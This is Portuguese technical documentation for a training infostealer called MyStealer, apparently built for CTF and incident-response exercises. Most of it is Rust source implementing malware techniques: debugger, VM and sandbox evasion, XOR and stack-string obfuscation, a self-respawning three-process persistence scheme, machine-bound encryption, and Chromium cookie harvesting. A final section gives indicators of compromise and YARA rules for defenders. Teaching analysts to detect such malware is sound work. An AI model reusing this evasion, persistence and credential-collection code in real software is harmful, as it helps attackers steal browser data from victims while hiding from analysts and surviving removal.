# 🎯 Técnicas e TTPs - MyStealer CTF Lab v0.3

## MITRE ATT&CK Mapping

| Técnica | ID | Categoria | Implementação |
|---------|----|-----------| --------------|
| Credentials from Password Stores | T1555 | Credential Access | `browser.rs` |
| Clipboard Data | T1115 | Collection | `clipboard.rs` |
| Data from Local System | T1005 | Collection | `files.rs` |
| System Information Discovery | T1082 | Discovery | `system_info.rs` |
| Automated Collection | T1119 | Collection | `CollectorManager` |
| Data Encrypted for Impact | T1486 | Impact | `crypto/` |
| Obfuscated Files or Information | T1027 | Defense Evasion | `obfuscated_strings.rs` |
| Debugger Evasion | T1622 | Defense Evasion | `anti_debug.rs` |
| Virtualization/Sandbox Evasion | T1497 | Defense Evasion | `anti_analysis.rs` |
| Process Injection | T1055 | Defense Evasion | `hydra.rs` (spawn) |

---

## 1. 🛡️ Técnicas Anti-Análise

### 1.1 Anti-Debug

#### Timing Check
Detecta delays causados por single-stepping ou breakpoints.

```rust
fn timing_check() -> bool {
    let start = Instant::now();
    
    let mut x = 0u64;
    for i in 0..1000 {
        x = x.wrapping_add(i);
        x = x.wrapping_mul(0x5851F42D4C957F2D);
        x = x.rotate_left(17);
    }
    black_box(x);
    
    // Se demorou mais de 50ms, debugger detectado
    start.elapsed() > Duration::from_millis(50)
}
```

#### TracerPid (Linux)
Verifica se há processo traçando via ptrace.

```rust
fn unix_debug_checks() -> bool {
    let status_path = "/proc/self/status";
    if let Ok(status) = std::fs::read_to_string(status_path) {
        for line in status.lines() {
            if let Some(pid) = line.strip_prefix("TracerPid:") {
                if pid.trim() != "0" {
                    return true; // Debugger detectado
                }
            }
        }
    }
    false
}
```

#### IsDebuggerPresent (Windows)
Via PowerShell para evitar import direto.

```rust
fn windows_debug_checks() -> bool {
    // [System.Diagnostics.Debugger]::IsAttached
    let check = "[System.Diagnostics.Debugger]::IsAttached";
    
    if let Ok(output) = Command::new("powershell")
        .args(["-NoProfile", "-Command", &check])
        .output()
    {
        let result = String::from_utf8_lossy(&output.stdout)
            .trim()
            .to_lowercase();
        return result == "true";
    }
    false
}
```

### 1.2 Anti-Disassembly

#### Opaque Predicates
Condições que parecem dinâmicas mas são matematicamente constantes.

```rust
/// Sempre retorna true, mas disassemblers não conseguem determinar
#[inline(never)]
pub fn opaque_true() -> bool {
    let x = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(1);
    
    // x² sempre >= 0 para qualquer x real
    // Mas análise estática não pode provar isso
    (x * x) >= 0 || x < 0
}

/// Sempre retorna false
#[inline(never)]
pub fn opaque_false() -> bool {
    let x = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as i128)
        .unwrap_or(1);
    
    // x² nunca é < 0 para números reais
    x * x < 0
}
```

#### Junk Code
Código inútil que confunde análise estática.

```rust
#[inline(never)]
pub fn junk_code_block() {
    let mut arr = [0u8; 64];
    
    // Operações que parecem importantes
    for i in 0..64 {
        arr[i] = (i as u8).wrapping_mul(0x41);
        arr[i] = arr[i].rotate_left(3);
        arr[i] ^= 0x55;
    }
    
    let mut sum = 0u64;
    for &b in &arr {
        sum = sum.wrapping_add(b as u64);
        sum = sum.wrapping_mul(0x100000001B3);
        if opaque_false() {
            sum = 0; // Nunca executa
        }
    }
    
    // Hash inútil
    let hash = sum.wrapping_mul(0x517CC1B727220A95);
    
    black_box(arr);
    black_box(hash);
    
    // Código morto
    if opaque_false() {
        panic!("This never happens");
    }
}
```

#### Indirect Calls
Chamadas via function pointers para confundir análise de fluxo.

```rust
#[inline(never)]
pub fn indirect_call<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    // Junk antes
    junk_code_block();
    
    // Execução real via indireção
    let result = f();
    
    // Código morto
    if opaque_false() {
        dead_code();
    }
    
    result
}
```

### 1.3 Detecção de VM

#### MAC Address Prefixes
```rust
fn has_vm_mac_prefix() -> bool {
    let vm_macs = [
        "00:0c:29",  // VMware
        "00:50:56",  // VMware
        "08:00:27",  // VirtualBox
        "52:54:00",  // QEMU/KVM
        "00:1c:42",  // Parallels
    ];
    
    // Verifica interfaces de rede
    for mac in &vm_macs {
        if network_has_mac_prefix(mac) {
            return true;
        }
    }
    false
}
```

#### VM Processes
```rust
fn has_vm_processes() -> bool {
    let vm_procs = [
        "vmtoolsd",      // VMware Tools
        "vmwaretray",    // VMware Tray
        "vboxservice",   // VirtualBox
        "vboxtray",      // VirtualBox Tray
        "qemu-ga",       // QEMU Guest Agent
        "xenservice",    // Xen
        "vmsrvc",        // Hyper-V
    ];
    
    let processes = get_running_processes();
    for p in &vm_procs {
        if processes.contains(p) {
            return true;
        }
    }
    false
}
```

#### DMI/SMBIOS (Linux)
```rust
fn check_dmi_info() -> bool {
    let dmi_paths = [
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/board_vendor",
    ];
    
    let vm_strings = [
        "vmware", "virtualbox", "vbox", "qemu", 
        "kvm", "xen", "hyper-v", "virtual",
    ];
    
    for path in &dmi_paths {
        if let Ok(content) = std::fs::read_to_string(path) {
            let lower = content.to_lowercase();
            for s in &vm_strings {
                if lower.contains(s) {
                    return true;
                }
            }
        }
    }
    false
}
```

### 1.4 Detecção de Sandbox

#### Usernames Suspeitos
```rust
fn has_suspicious_username() -> bool {
    let user = whoami::username().to_lowercase();
    
    let suspicious = [
        "sandbox", "virus", "malware", "sample", "test",
        "cuckoo", "analyst", "vmware", "virtual", "honey",
        "admin", "john", "user",
    ];
    
    for s in &suspicious {
        if user.contains(s) {
            return true;
        }
    }
    false
}
```

#### Recursos Baixos
```rust
fn has_low_resources() -> bool {
    let cpus = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    
    let ram_gb = sysinfo::System::new_all().total_memory() 
        / (1024 * 1024 * 1024);
    
    // Menos de 2 CPUs ou 2GB RAM = suspeito
    cpus < 2 || ram_gb < 2
}
```

---

## 2. 🔐 Técnicas de Ofuscação de Strings

### 2.1 XOR Encoding

Strings sensíveis são codificadas com XOR e decodificadas em runtime.

```rust
/// Decodifica string XOR em runtime
#[inline(always)]
fn xd(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

// Exemplo: "sandbox" XOR 0x19
fn get_sandbox_string() -> String {
    xd(&[0x7a, 0x76, 0x69, 0x75, 0x77, 0x68, 0x63], 0x19)
}

// Exemplo: "vmtoolsd" XOR 0x19
fn get_vmtools_string() -> String {
    xd(&[0x6f, 0x6c, 0x7d, 0x6c, 0x6c, 0x69, 0x7c, 0x75], 0x19)
}
```

**Chaves XOR Usadas:**
| Key | Uso |
|-----|-----|
| `0x17` | Paths de sistema |
| `0x19` | Nomes de processos, usernames |
| `0x33` | Variáveis de ambiente |
| `0x42` | Nomes de browsers |
| `0x55` | Strings de crypto |
| `0x77` | Ferramentas de análise |

### 2.2 Stack Strings

Strings construídas caractere por caractere na stack.

```rust
#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars {
        s.push(c);
    }
    black_box(s)
}

// Uso: "tasklist" sem aparecer no binário
fn get_tasklist_cmd() -> String {
    bs(&['t','a','s','k','l','i','s','t'])
}

// Uso: path de sistema
fn get_cache_path() -> String {
    bs(&['.','c','a','c','h','e'])
}
```

### 2.3 Runtime SQL Building

Queries SQL montadas caractere por caractere.

```rust
fn build_cookies_query() -> String {
    let mut q = String::with_capacity(100);
    
    // "SELECT host_key, name, value..."
    for c in ['S','E','L','E','C','T',' '] { q.push(c); }
    for c in ['h','o','s','t','_','k','e','y',',',' '] { q.push(c); }
    for c in ['n','a','m','e',',',' '] { q.push(c); }
    for c in ['v','a','l','u','e',',',' '] { q.push(c); }
    // ... resto da query
    for c in ['F','R','O','M',' '] { q.push(c); }
    for c in ['c','o','o','k','i','e','s'] { q.push(c); }
    
    black_box(q)
}
```

### 2.4 Conditional Compilation

Logs removidos com feature flag `silent`.

```rust
// Cargo.toml
[features]
silent = []

// Macro condicional
#[macro_export]
#[cfg(feature = "silent")]
macro_rules! log_info {
    ($($arg:tt)*) => {
        // Noop - sem logs
        let _ = || { format!($($arg)*) };
    };
}

#[macro_export]
#[cfg(not(feature = "silent"))]
macro_rules! log_info {
    ($($arg:tt)*) => {
        tracing::info!($($arg)*)
    };
}
```

---

## 3. 🐍 Sistema Hydra (Persistência Multi-Processo)

### 3.1 Arquitetura

```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   ALPHA     │◄───►│    BETA     │◄───►│   GAMMA     │
│  (Primary)  │     │  (Backup 1) │     │  (Backup 2) │
└──────┬──────┘     └──────┬──────┘     └──────┬──────┘
       │                   │                   │
       │    Heartbeat      │    Heartbeat      │
       │    (5 segundos)   │    (5 segundos)   │
       │                   │                   │
       └───────────────────┼───────────────────┘
                           │
                    ┌──────▼──────┐
                    │  IPC Dir    │
                    │ (arquivos)  │
                    └─────────────┘
```

### 3.2 Claim de Identidade

```rust
fn claim_head(ipc_dir: &PathBuf) -> Result<HydraHead, HydraError> {
    for i in 0..HYDRA_HEADS {
        let head = HydraHead::from_index(i).unwrap();
        let lock_path = ipc_dir.join(format!("{}.lock", head.name()));
        
        // Tenta criar lock exclusivo
        match try_acquire_lock(&lock_path) {
            Ok(true) => return Ok(head),  // Conseguiu!
            Ok(false) => continue,         // Já existe
            Err(_) => continue,
        }
    }
    
    Err(HydraError::AllHeadsClaimed)
}

fn try_acquire_lock(path: &PathBuf) -> Result<bool, HydraError> {
    if path.exists() {
        // Verifica se processo ainda está vivo
        if let Ok(content) = fs::read_to_string(path) {
            if let Ok(pid) = content.trim().parse::<u32>() {
                if process_exists(pid) {
                    return Ok(false); // Lock válido
                }
            }
        }
        // Lock órfão, remove
        let _ = fs::remove_file(path);
    }
    
    // Cria novo lock com nosso PID
    let mut file = File::create(path)?;
    write!(file, "{}", std::process::id())?;
    Ok(true)
}
```

### 3.3 Heartbeat System

```rust
pub fn send_heartbeat(&self) -> Result<(), HydraError> {
    let hb_path = self.ipc_dir.join(format!("{}.hb", self.my_head.name()));
    
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    
    // Formato: PID:TIMESTAMP
    let mut file = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open(&hb_path)?;
    
    write!(file, "{}:{}", std::process::id(), timestamp)?;
    Ok(())
}

pub fn check_siblings(&mut self) -> Vec<HydraHead> {
    let mut dead_heads = Vec::new();
    
    for sibling in self.my_head.siblings() {
        let hb_path = self.ipc_dir.join(format!("{}.hb", sibling.name()));
        
        let is_alive = if let Ok(content) = fs::read_to_string(&hb_path) {
            if let Some(ts_str) = content.split(':').nth(1) {
                if let Ok(ts) = ts_str.trim().parse::<u64>() {
                    let now = get_current_timestamp();
                    // Timeout de 15 segundos
                    now.saturating_sub(ts) < HEARTBEAT_TIMEOUT
                } else { false }
            } else { false }
        } else { false };
        
        if !is_alive {
            dead_heads.push(sibling);
        }
    }
    
    dead_heads
}
```

### 3.4 Auto-Respawn com Backoff

```rust
pub fn respawn_head(&mut self, head: HydraHead) -> Result<(), HydraError> {
    // Limpa arquivos antigos
    let lock_path = self.ipc_dir.join(format!("{}.lock", head.name()));
    let hb_path = self.ipc_dir.join(format!("{}.hb", head.name()));
    let _ = fs::remove_file(&lock_path);
    let _ = fs::remove_file(&hb_path);
    
    // Backoff exponencial (2^n segundos, max 60s)
    let state = self.heads.get_mut(&head).unwrap();
    let backoff = std::cmp::min(
        2u64.pow(state.respawn_count),
        MAX_RESPAWN_BACKOFF
    );
    state.respawn_count += 1;
    
    if backoff > 1 {
        std::thread::sleep(Duration::from_secs(backoff));
    }
    
    // Spawn novo processo
    let exe_path = std::env::current_exe()?;
    let child = Command::new(&exe_path)
        .args(["--skip-checks", "--hydra-role", head.name()])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()?;
    
    state.pid = Some(child.id());
    self.children.push(child);
    
    Ok(())
}
```

---

## 4. 🔐 Técnicas de Criptografia

### 4.1 Key Derivation

```rust
pub fn derive_key() -> Result<[u8; 32], CryptoError> {
    let machine_id = get_machine_id()?;
    
    // Salt ofuscado (construído byte a byte)
    let salt = get_obfuscated_salt();
    
    let mut key = [0u8; 32];
    Argon2::default()
        .hash_password_into(machine_id.as_bytes(), &salt, &mut key)?;
    
    Ok(key)
}

fn get_obfuscated_salt() -> [u8; 16] {
    // Cada byte construído via XOR para evitar padrões
    let mut salt = [0u8; 16];
    salt[0] = 0x63 ^ 0x00;  // 'c'
    salt[1] = 0x74 ^ 0x00;  // 't'
    salt[2] = 0x66 ^ 0x00;  // 'f'
    // ... resto do salt
    salt
}
```

### 4.2 AES-256-GCM Encryption

```rust
pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
    let cipher = Aes256Gcm::new_from_slice(&self.key)?;
    
    // Nonce aleatório de 12 bytes
    let nonce_bytes: [u8; 12] = rand::random();
    let nonce = Nonce::from_slice(&nonce_bytes);
    
    let ciphertext = cipher.encrypt(nonce, data)?;
    
    // Formato: nonce (12 bytes) || ciphertext
    let mut result = Vec::with_capacity(12 + ciphertext.len());
    result.extend_from_slice(&nonce_bytes);
    result.extend(ciphertext);
    
    Ok(result)
}
```

### 4.3 Byte Shuffling

```rust
pub fn shuffle_bytes(data: &[u8], seed: u64) -> Vec<u8> {
    let mut result: Vec<u8> = data.to_vec();
    let len = result.len();
    
    // Fisher-Yates shuffle com seed determinístico
    let mut rng_state = seed;
    for i in (1..len).rev() {
        // LCG simples para gerar índice
        rng_state = rng_state.wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        let j = (rng_state as usize) % (i + 1);
        result.swap(i, j);
    }
    
    result
}

pub fn unshuffle_bytes(data: &[u8], seed: u64) -> Vec<u8> {
    // Gera sequência de swaps
    let len = data.len();
    let mut swaps = Vec::with_capacity(len);
    let mut rng_state = seed;
    
    for i in (1..len).rev() {
        rng_state = rng_state.wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        let j = (rng_state as usize) % (i + 1);
        swaps.push((i, j));
    }
    
    // Aplica swaps em ordem reversa
    let mut result = data.to_vec();
    for (i, j) in swaps.into_iter().rev() {
        result.swap(i, j);
    }
    
    result
}
```

### 4.4 UUID Encoding

```rust
pub fn encode_as_uuid(data: &[u8]) -> Vec<String> {
    // Cada UUID pode conter 16 bytes de dados
    data.chunks(16).map(|chunk| {
        let mut bytes = [0u8; 16];
        bytes[..chunk.len()].copy_from_slice(chunk);
        
        // Formata como UUID
        format!(
            "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
            u32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]),
            u16::from_be_bytes([bytes[4], bytes[5]]),
            u16::from_be_bytes([bytes[6], bytes[7]]),
            u16::from_be_bytes([bytes[8], bytes[9]]),
            u64::from_be_bytes([0, 0, bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]])
        )
    }).collect()
}
```

---

## 5. 📊 Coleta de Dados

### 5.1 Browser Cookies (Chromium)

```rust
fn read_chromium_cookies(&self, db_path: &PathBuf) -> Result<Vec<CookieEntry>, CollectorError> {
    // Copia para evitar lock do browser
    let tmp = std::env::temp_dir().join(format!("cookies_{}.db", std::process::id()));
    std::fs::copy(db_path, &tmp)?;
    
    let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)?;
    
    // Query construída em runtime (anti-static analysis)
    let query = Self::build_cookies_query();
    let mut stmt = conn.prepare(&query)?;
    
    let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
        Ok(CookieEntry {
            domain: row.get(0)?,
            name: row.get(1)?,
            value: "[REDACTED]".to_string(), // Lab mode
            expires: row.get(3).ok(),
            is_secure: row.get::<_, i32>(4).unwrap_or(0) == 1,
            is_http_only: row.get::<_, i32>(5).unwrap_or(0) == 1,
        })
    })?
    .filter_map(|r| r.ok())
    .collect();
    
    let _ = std::fs::remove_file(&tmp);
    Ok(cookies)
}
```

---

## 6. 🔍 Detecção e Defesa (Blue Team)

### 6.1 Indicadores de Compromisso

**Arquivos:**
```yaml
Linux:
  - ~/.cache/fontconfig/alpha.lock
  - ~/.cache/fontconfig/*.hb
  
Windows:
  - %LOCALAPPDATA%\.cache\ms-runtime\*.lock
  - %LOCALAPPDATA%\.cache\ms-runtime\*.hb
```

**Comportamento:**
```yaml
- Múltiplos processos idênticos (3 instâncias)
- Arquivos .hb atualizados a cada 5 segundos
- Respawn automático após kill
- Acesso a Cookies/Login Data dos browsers
- Leitura de /etc/machine-id
```

### 6.2 Yara Rules

```yara
rule MyStealer_Hydra_IPC {
    meta:
        description = "Detecta arquivos IPC do MyStealer Hydra"
    
    strings:
        $format = /\d+:\d{10}/  // PID:timestamp
        
    condition:
        filesize < 50 and $format
}

rule MyStealer_Obfuscated_Strings {
    meta:
        description = "Detecta padrões de XOR encoding"
    
    strings:
        // Padrões comuns de XOR decode
        $xor1 = { 0F B6 ?? ?? 30 ?? }  // movzx + xor
        
    condition:
        uint16(0) == 0x5A4D and $xor1
}
```

### 6.3 Ferramentas de Defesa

| Ferramenta | Uso |
|------------|-----|
| **Sysmon** | Monitorar CreateProcess, FileCreate |
| **ProcMon** | Analisar I/O de arquivos |
| **Wireshark** | Capturar exfiltração |
| **x64dbg** | Debug dinâmico |
| **IDA Pro** | Análise estática |
| **Ghidra** | Decompilação |

---

## 📚 Referências

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development)
- [Anti-Debug Tricks](https://anti-debug.checkpoint.com/)
- [VX Underground](https://vx-underground.org/)

---

*Documentação para fins educacionais - CTF IR Training*
